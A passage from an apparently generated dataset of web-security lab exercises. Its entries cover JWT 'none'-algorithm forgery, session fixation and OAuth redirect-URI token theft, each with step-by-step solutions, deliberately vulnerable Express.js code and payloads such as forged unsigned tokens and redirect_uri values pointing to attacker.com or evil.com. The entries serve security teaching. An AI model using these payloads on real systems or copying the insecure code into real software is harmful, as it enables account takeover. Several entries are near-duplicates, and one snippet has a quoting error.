          "1. Capture a valid JWT after logging in as a normal user using Burp Suite.",
          "2. Decode the JWT using jwt.io or a Python script and observe the 'alg' field in the header.",
          "3. Modify the JWT header by changing the algorithm to 'none'. Edit the payload to {\"role\": \"admin\"}.",
          "4. Remove the signature part (third segment) completely.",
          "5. Replace the original JWT with the tampered token in the Authorization header using Burp Repeater and send a request to /admin/dashboard to verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username && password) { const token = jwt.sign({ user: username, role: 'user' }, 'insecure-secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Login failed'); } }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token); if (decoded && decoded.role === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT None Alg Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
          "Authorization: Bearer <forged_token>"
        ]
      },
      {
        "Lab scenario": "Session fixation in login flow using pre-authenticated session IDs",
        "Lab Description": "The application does not regenerate session tokens upon successful login, allowing an attacker to pre-assign a session to the victim. The attacker forces the victim to authenticate using a known session ID. To solve: Fix a session ID for Carlos, get him to log in, and reuse that session to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to send a GET /login request and observe that a Set-Cookie: session=<value> header is received before authentication.",
          "2. Note the session ID and craft a phishing link with this ID (e.g., https://vulnerable-site.com/login?session=fixed1234).",
          "3. Assume Carlos logs in via this link, attaching the fixed session ID to his authenticated session.",
          "4. After Carlos logs in, reuse the same session ID in your browser or via Burp with the session=fixed1234 cookie.",
          "5. Visit /my-account to confirm Carlos's session is hijacked and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: 'supersecure' }; app.get('/login', (req, res) => { const sid = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\"><br>Password: <input name=\"password\"><br><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else { res.status(403).send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] === 'carlos') { res.send('Carlos account details'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "https://vulnerable.com/login?session=fixed1234",
          "Cookie: session=fixed1234"
        ]
      },
      {
        "Lab scenario": "OAuth implicit grant token leakage via referrer",
        "Lab Description": "The application uses OAuth2 Implicit Grant flow with the access token exposed in the URL fragment. Due to improper redirect URI configuration, the token leaks through referrer headers when redirected to third-party content. To solve: Capture Carlos's access token from a leaked referrer and use it to access his profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use a malicious redirect URI that points to your controlled site, e.g., https://attacker.com#access_token=<token>.",
          "2. Trick Carlos into authenticating with the OAuth provider using this redirect URI.",
          "3. On redirection, observe the access token fragment in your server logs or browser developer tools.",
          "4. Use Postman to send a GET request to https://vulnerable-site.com/api/user-profile with the Authorization: Bearer <leaked_token> header.",
          "5. Confirm that the token grants access to Carlos’s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = { carlos: { profile: 'Carlos user profile', token: 'abc123token' } }; app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (token) { res.redirect(`https://cdn.tracker.com/image.png#access_token=${token}`); } else { res.send('OAuth failed'); } }); app.get('/api/user-profile', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader?.split(' ')[1]; if (token === 'abc123token') { res.send(users.carlos.profile); } else { res.status(403).send('Access Denied'); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running'));",
        "payloads": [
          "https://auth-server.com/oauth/authorize?response_type=token&client_id=abc&redirect_uri=https://attacker.com",
          "Authorization: Bearer abc123token"
        ]
      },
      {
        "Lab scenario": "JWT tampering Authentication bypass in API endpoint",
        "Lab Description": "The backend API uses JWTs to authenticate users, but fails to properly verify the signing algorithm. The application trusts the 'alg' value in the token header and skips verification if it's set to 'none'. To solve: Access the admin endpoint using a forged token that impersonates the user 'carlos'.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a valid JWT by logging in as a regular user.",
          "2. Decode the token using jwt.io or a similar tool. Note the 'alg' and payload contents.",
          "3. Change the header 'alg' value to 'none' and set the payload sub/username to 'carlos'.",
          "4. Remove the signature portion of the token and reassemble it as a two-part JWT.",
          "5. Replay the modified token in a request to the /admin endpoint using Postman or Burp Repeater and verify successful access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; } else { req.user = jwt.verify(token, secret); } next(); } catch (e) { res.status(401).send('Invalid token'); } } else { res.status(401).send('No token'); } }); app.get('/admin', (req, res) => { if (req.user && req.user.username === 'carlos') { res.send('Welcome, admin carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ."
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "The session management mechanism reuses a client-supplied session ID even after successful authentication. The application does not regenerate session tokens upon login. To solve: Inject a known session ID and get the victim (Carlos) to log in using that ID, then hijack the session and access their account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to issue a GET request to /login with a custom Set-Cookie: session=attacker123.",
          "2. Send a crafted phishing link with this session ID to Carlos via the /contact endpoint or similar feature.",
          "3. After Carlos logs in, revisit the app using the session=attacker123 cookie in your browser or Burp Repeater.",
          "4. Access the /my-account endpoint and observe that it now shows Carlos's account.",
          "5. Confirm the session takeover by modifying Carlos's profile data or capturing internal data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || req.query.session || 'guest'; sessions[sid] = username; res.cookie('session', sid); res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') { res.send('Account page of carlos'); } else { res.send('Not authorized'); } }); app.listen(4000);",
        "payloads": [
          "Cookie: session=attacker123",
          "https://example.com/login?session=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in redirect URI",
        "Lab Description": "The OAuth implementation fails to validate the redirect URI strictly, allowing open redirection and leakage of the authorization code. An attacker can inject a malicious URI with their own domain. To solve: Intercept the OAuth code for Carlos and exchange it for an access token to access the /api/userinfo endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP or Burp to inspect the OAuth authorization request flow.",
          "2. Observe that the redirect_uri parameter is vulnerable to open redirection.",
          "3. Register your own endpoint or use an HTTP listener (e.g., webhook.site) to capture requests.",
          "4. Send Carlos a phishing link to initiate the OAuth login with redirect_uri pointing to your domain.",
          "5. When Carlos clicks the link and authenticates, capture the authorization code and exchange it for a token using curl/Postman.",
          "6. Use the token to call /api/userinfo and confirm Carlos's identity."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const url = require('url'); const tokens = {}; const authCodes = {}; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; if (client_id === 'trusted-app') { const code = 'authcode123'; authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); } else { res.status(400).send('Invalid client'); } }); app.get('/token', (req, res) => { const { code } = req.query; if (authCodes[code]) { const token = 'token-' + authCodes[code]; tokens[token] = authCodes[code]; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/api/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user === 'carlos') { res.json({ username: 'carlos', role: 'user' }); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "https://auth.example.com/authorize?client_id=trusted-app&redirect_uri=https://webhook.site/your_id&response_type=code&state=xyz",
          "GET /token?code=authcode123",
          "Authorization: Bearer token-carlos"
        ]
      },
      {
        "Lab scenario": "JWT 'none' algorithm authentication bypass in login API",
        "Lab Description": "This lab uses JSON Web Tokens (JWTs) to manage user sessions. The backend fails to validate the `alg` field properly, accepting unsigned tokens when `alg` is set to `none`. The application returns a JWT after login and uses it for accessing protected endpoints. To solve: tamper with the JWT to impersonate Carlos and access his account without valid credentials.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Log in using your own credentials and intercept the POST /login response in Burp Suite to extract your JWT token.",
          "2. Decode the JWT using jwt.io or Burp Decoder. Note the payload and header structure.",
          "3. Modify the JWT header to use \"alg\":\"none\" and change the payload to {\"username\":\"carlos\"}.",
          "4. Remove the JWT signature entirely and base64-encode the new header and payload.",
          "5. Replace your token with the tampered one in the Authorization: Bearer header and send a request to /my-account.",
          "6. If successful, you'll see Carlos's account information, completing the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'carlos123' }, { username: 'guest', password: 'guest123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(400).send('Invalid token'); const username = decoded.payload.username; res.send(`Account info for ${username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{\"alg\":\"none\"}.{\"username\":\"carlos\"}.",
          "Authorization: Bearer [header.payload.]"
        ]
      },
      {
        "Lab scenario": "Session fixation in login flow via GET parameter",
        "Lab Description": "This lab implements session management using a custom session ID passed as a URL parameter and stored as a cookie. However, the session is not regenerated after login, making it vulnerable to session fixation. To solve: set a session ID for Carlos before login and hijack his session after he authenticates.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to initiate a session with a fixed session ID, e.g., GET /login?session=attack123 and observe that it is set as a cookie.",
          "2. Send Carlos a crafted phishing link containing your session ID, like /login?session=attack123.",
          "3. After Carlos logs in, the server reuses the same session ID (no regeneration).",
          "4. Reuse the session ID attack123 in your browser and access /my-account. You'll be logged in as Carlos.",
          "5. Confirm the account switch and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'secret123', alice: 'password' }; const sessions = {}; app.get('/login', (req, res) => { const sid = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('Login page with session set'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session; sessions[sid] = username; res.send('Logged in'); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (!user) return res.status(403).send('Unauthorized'); res.send(`Welcome ${user}`); }); app.listen(4001, () => console.log('Session Fixation Lab running on port 4001'));",
        "payloads": [
          "/login?session=attack123",
          "Set-Cookie: session=attack123",
          "POST /login with session cookie set to attack123"
        ]
      },
      {
        "Lab scenario": "OAuth token reuse due to lack of client binding",
        "Lab Description": "This lab involves an OAuth flow where the access token is not bound to a specific client application. A malicious actor can reuse a token issued to one client on another. The application does not validate the `aud` or `client_id`. To solve: reuse an access token issued to your app to impersonate Carlos on the victim app.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Authenticate using your own credentials via the OAuth flow in App A and intercept the access token.",
          "2. Note that the token payload contains only the username and expiry, with no client-specific claims.",
          "3. Copy the token and use Postman or Burp to access App B's /my-account endpoint, adding the Authorization: Bearer [token] header.",
          "4. Change the payload of the token to impersonate Carlos (e.g., \"sub\":\"carlos\") and re-sign it using the same shared secret (if known or hardcoded).",
          "5. Send the forged token to App B to access Carlos's account.",
          "6. Success is confirmed when App B responds with Carlos's account details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'shared-oauth-secret'; const users = { carlos: {}, alice: {} }; app.get('/auth', (req, res) => { const user = req.query.user || 'alice'; const token = jwt.sign({ sub: user, exp: Math.floor(Date.now() / 1000) + 3600 }, secret); res.send({ access_token: token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Missing token'); try { const decoded = jwt.verify(token, secret); res.send(`Account details for ${decoded.sub}`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4002, () => console.log('OAuth Token Misuse Lab running on port 4002'));",
        "payloads": [
          "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjYXJsb3MiLCJleHAiOjE3MDAwMDAwMDB9.[signature]",
          "Authorization: Bearer [reused_token_from_AppA]",
          "jwt.sign({sub:'carlos'}, 'shared-oauth-secret')"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "The application initializes a session ID before user authentication and fails to regenerate it after login. The session ID remains fixed, allowing an attacker to hijack authenticated sessions. The application trusts any valid session ID. To solve: Hijack Carlos's authenticated session by forcing him to reuse your crafted session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite Proxy to intercept a GET request to the login page. Notice the Set-Cookie: session=XYZ header.",
          "2. Note the session ID and forward the request to generate a fixed session before login.",
          "3. Use a crafted phishing email (or simulated social engineering) to convince Carlos to log in using your provided session ID (simulate this via cookie manipulation).",
          "4. Once Carlos logs in via that session, reuse the same session ID to access the authenticated /my-account page.",
          "5. Confirm access to Carlos's session by viewing the protected content on his account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { if (!req.cookies.session) res.cookie('session', Math.random().toString(36).substring(2)); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) res.send('Logged in'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.cookies.session) res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Set-Cookie: session=attacker123",
          "https://vulnerable-site.com/login; Cookie: session=attacker123",
          "Cookie injection via phishing link with crafted session"
        ]
      },
      {
        "Lab scenario": "JWT signature verification bypass using 'none' algorithm",
        "Lab Description": "This application uses JWT for session management but fails to validate the signature algorithm securely. If the 'alg' field in the JWT header is set to 'none', the server skips signature verification. To solve: Forge a JWT with 'alg':'none' and escalate privileges to access Carlos's account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in to your account and inspect the session cookie. Decode the JWT using jwt.io or Burp Decoder.",
          "2. Note the header and payload. The current 'alg' is likely 'HS256'.",
          "3. Modify the JWT header to use 'alg':'none' and change the payload to impersonate carlos.",
          "4. Remove the signature part completely (only use header.payload).",
          "5. Replay the forged JWT as a session cookie and access /my-account to verify Carlos's data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const SECRET = 'secret'; app.get('/login', (req, res) => { const token = jwt.sign({ username: 'wiener' }, SECRET); res.cookie('auth', token).send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const user = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (user.username === 'carlos') res.send('Carlos's account info'); else res.send('User account'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Header: { \"alg\": \"none\" }, Payload: { \"username\": \"carlos\" }, No signature",
          "JWT with only header.payload format"
        ]
      },
      {
        "Lab scenario": "OAuth token leak in redirect_uri via fragment mismanagement",
        "Lab Description": "The app uses OAuth2 with implicit flow for third-party login. It misuses the redirect_uri allowing an attacker to inject a malicious domain. The access token is returned in the fragment portion of the URI and can be exfiltrated. To solve: Extract Carlos's token by crafting a redirect_uri to a domain under your control.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP or Burp Suite to intercept the OAuth flow and inspect the redirect_uri parameter.",
          "2. Craft a redirect_uri pointing to attacker.com/#. The application appends the access_token after the hash.",
          "3. Simulate sending Carlos a link to login via OAuth using the crafted redirect_uri.",
          "4. Capture the access_token from the request at attacker.com using a local server.",
          "5. Replay the access token in a GET request to /my-account with Authorization: Bearer <token> header to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const token = 'access-token-carlos'; res.redirect(`${redirect}#access_token=${token}&token_type=bearer`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-carlos') res.send('Carlos private data'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Leak Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://oauth-provider.com/auth?redirect_uri=https://attacker.com/",
          "access_token=access-token-carlos",
          "Authorization: Bearer access-token-carlos"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion vulnerability in login authentication",
        "Lab Description": "The application uses JWT for authentication and is vulnerable due to insecure algorithm handling. It accepts tokens signed with 'none' algorithm if the header is tampered. The application does not verify the integrity of the JWT properly, allowing attackers to forge tokens. To solve: forge a valid token to impersonate the user 'admin' and access their dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a POST /login request and retrieve your JWT token from the Set-Cookie header.",
          "Decode the JWT using jwt.io or Postman. Observe that the header specifies 'HS256'.",
          "Modify the header to use 'none' as the algorithm and change the payload sub value to 'admin'.",
          "Remove the signature section entirely and re-encode the JWT.",
          "Replace the JWT in your cookie with the tampered token and access /admin-dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = { 'admin': 'adminpass', 'user': 'userpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.cookie('auth', token); res.send('Logged in'); } else { res.status(403).send('Invalid login'); } }); app.get('/admin-dashboard', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.sub === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via referer header in third-party redirect",
        "Lab Description": "The application uses OAuth for login via a third-party provider, but after authentication, it leaks the access token through the Referer header when redirecting to a third-party domain. This token can be captured by any attacker-controlled site in the redirect chain. To solve: capture Carlos's access token and use it to access their profile endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to intercept the OAuth redirect flow and inspect the Referer headers.",
          "Log in with your own account and observe that the final redirect URL leaks the access_token in the Referer header.",
          "Create an exploit HTML page that initiates the OAuth flow and uses a malicious redirect_uri controlled by you.",
          "Send a crafted OAuth link to Carlos via the built-in message feature to click.",
          "Capture the access token in your server logs and replay it to the /user/profile endpoint to impersonate Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/oauth/callback', (req, res) => { const { access_token } = req.query; res.redirect(`http://external-analytics.com/?token=${access_token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') { res.send('Welcome Carlos'); } else { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Leakage Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://auth.example.com/oauth/authorize?client_id=123&redirect_uri=http://attacker.com&response_type=token",
          "Authorization: Bearer token-carlos"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login redirect",
        "Lab Description": "This application initializes a session before login and uses the same session ID post-login. If an attacker can set a session ID for a victim before they log in, the attacker can hijack the session. To solve: force Carlos to use a session ID you control, then log in as Carlos and access his profile with your fixed session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to initiate a GET /login request and observe the session ID being returned via Set-Cookie.",
          "Craft a link with a fixed session ID using GET /login?session=fixed123 and send this to Carlos through the feedback form.",
          "Once Carlos logs in via that link, he will be assigned session=fixed123.",
          "Use Burp Repeater to replay requests with session=fixed123 and access the /profile endpoint.",
          "Verify you are logged in as Carlos by confirming his email and profile data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'supersecure' }; app.get('/login', (req, res) => { const sessId = req.query.session || Math.random().toString(36).slice(2); sessions[sessId] = null; res.cookie('session', sessId); res.send('<form method=\"POST\">Username:<input name=\"username\">Password:<input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const sessId = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sessId] = username; res.redirect('/profile'); } else { res.send('Login failed'); } }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome ${user}`); } else { res.status(403).send('Not logged in'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "GET /login?session=fixed123",
          "Cookie: session=fixed123",
          "POST /login with username=carlos&password=supersecure"
        ]
      },
      {
        "Lab scenario": "JWT signature none algorithm tampering in session authentication",
        "Lab Description": "The application uses JWT tokens to manage session state, but fails to validate the token signature algorithm properly. The backend accepts 'none' as a valid algorithm, bypassing token integrity verification. To solve: Forge a valid JWT token for the user 'carlos' and access his account page without needing credentials.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture your JWT after logging in with your own credentials.",
          "2. Decode the JWT using jwt.io or a local tool and observe that the algorithm is set to HS256.",
          "3. Modify the header to use 'alg':'none' and remove the signature part entirely.",
          "4. Change the payload to {\"username\":\"carlos\"} and re-encode the JWT without signing it.",
          "5. Replace your session cookie with the forged token and reload the /account page.",
          "6. Verify access to Carlos's account page, which confirms successful exploitation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'pass123' }]; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid login'); const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in'); }); app.get('/account', (req, res) => { const token = req.cookies.session; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload && payload.payload.username === 'carlos') res.send('Welcome Carlos!'); else res.send('Access denied'); }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "base64({\"alg\":\"none\"}).base64({\"username\":\"carlos\"})."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration with implicit grant leaking tokens via redirect",
        "Lab Description": "The application uses OAuth with the implicit flow and incorrectly allows redirect URIs to be manipulated, causing access tokens to be leaked to third-party domains. To solve: Capture Carlos’s access token and use it to access his protected profile page via the API.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Intercept the OAuth authorization URL when logging in and notice the use of response_type=token.",
          "2. Modify the redirect_uri parameter to point to an attacker-controlled site (e.g., https://attacker.com/callback).",
          "3. Wait for Carlos to log in and capture the fragment containing the access_token from your server logs.",
          "4. Replay the token in a Bearer authorization header using Postman or Burp Repeater.",
          "5. Send a GET request to /api/profile with the Authorization: Bearer <token> header.",
          "6. Confirm access to Carlos’s profile data to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = 'token-for-carlos'; res.redirect(`${redirect_uri}#access_token=${token}`); } else { res.send('Unsupported flow'); } }); app.get('/api/profile', (req, res) => { const auth = req.headers.authorization; if (auth && auth.includes('token-for-carlos')) res.send('Profile data of Carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "https://vulnsite.com/auth?response_type=token&client_id=xyz&redirect_uri=https://evil.com",
          "GET /api/profile HTTP/1.1\\nAuthorization: Bearer token-for-carlos"
        ]
      },
      {
        "Lab scenario": "Session fixation via unvalidated session token reuse",
        "Lab Description": "The login endpoint fails to issue a new session identifier upon successful authentication, allowing an attacker to pre-define a session ID and force it onto a victim. To solve: Fixate Carlos's session ID, get him to log in using it, and hijack the session by accessing his My Account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp to generate a new session ID by visiting the login page anonymously and capturing the Set-Cookie header.",
          "2. Craft a phishing link to login with that specific session ID in the Cookie header and trick Carlos into using it.",
          "3. After Carlos logs in using the fixated session, use the same session ID to access the /my-account endpoint.",
          "4. Confirm successful access by observing Carlos’s account data.",
          "5. Capture a screenshot or extract specific identifiers to verify session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'secret123' }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] === password) { const sid = req.cookies.sessionid; sessions[sid] = username; res.send('Logged in'); } else res.send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; const user = sessions[sid]; if (user === 'carlos') res.send('Carlos Account Details'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
        "payloads": [
          "Cookie: sessionid=attackerFixedSID",
          "GET /login?username=carlos&password=secret123 HTTP/1.1\\nCookie: sessionid=attackerFixedSID",
          "GET /my-account HTTP/1.1\\nCookie: sessionid=attackerFixedSID"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration allows session fixation attack in login flow",
        "Lab Description": "The application implements OAuth 2.0 for third-party authentication, but fails to regenerate the session ID after login. An attacker can fixate a session ID and force the victim to authenticate with it. The application reuses the original session after OAuth login. To solve: Hijack Carlos’s session by initiating login via a pre-fixed session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept /login with Burp Suite and note session cookie before redirect to OAuth provider.",
          "Confirm session ID is retained post OAuth callback via /oauth/callback endpoint.",
          "Craft phishing link that initiates login with fixed session and send it to victim.",
          "Wait for Carlos to authenticate via OAuth; then reuse the same session ID in your browser.",
          "Access /my-account as Carlos with hijacked session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.session.oauthStart = true; res.redirect('https://oauth-provider.com/auth'); }); app.get('/oauth/callback', (req, res) => { if (req.session.oauthStart) { req.session.user = 'carlos'; res.redirect('/my-account'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Account details for ' + req.session.user); else res.status(401).send('Not authenticated'); }); app.listen(4000);",
        "payloads": [
          "GET /login with pre-issued session cookie",
          "Reuse same session cookie after Carlos OAuth login",
          "Access /my-account with hijacked session"
        ]
      },
      {
        "Lab scenario": "JWT token tampering with 'none' algorithm in Authorization header",
